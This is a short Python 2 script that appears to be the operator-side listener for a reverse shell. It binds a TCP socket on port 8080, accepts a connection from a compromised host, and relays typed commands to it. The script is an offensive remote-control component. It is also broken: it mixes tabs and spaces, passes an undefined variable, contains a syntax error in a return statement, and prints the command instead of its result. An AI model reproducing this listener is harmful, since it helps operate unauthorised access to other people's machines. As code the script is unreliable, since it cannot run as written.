import socket

class Listener:
	def __init__(self,ip,port):
		my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		my_listener.bind((ip,port))# IP Adress and desired port
		my_listener.listen(0)
		print("Listening...")
		(self.connection, my_address) = my_listener.accept()
		print("Connection Success From "+ str(my_address))

 	def start_listener(self):
		while True:
			command_input = raw_input("Enter Command : ")
			command_output = self.command_execution(command_execution)
			print(command_input)

	def command_execution(self, command_input):
		self.connection.send(command_input)
		return command_input  = self.connection.recv(1024)

listener = Listener("0.0.0.0",8080)
listener.start_listener()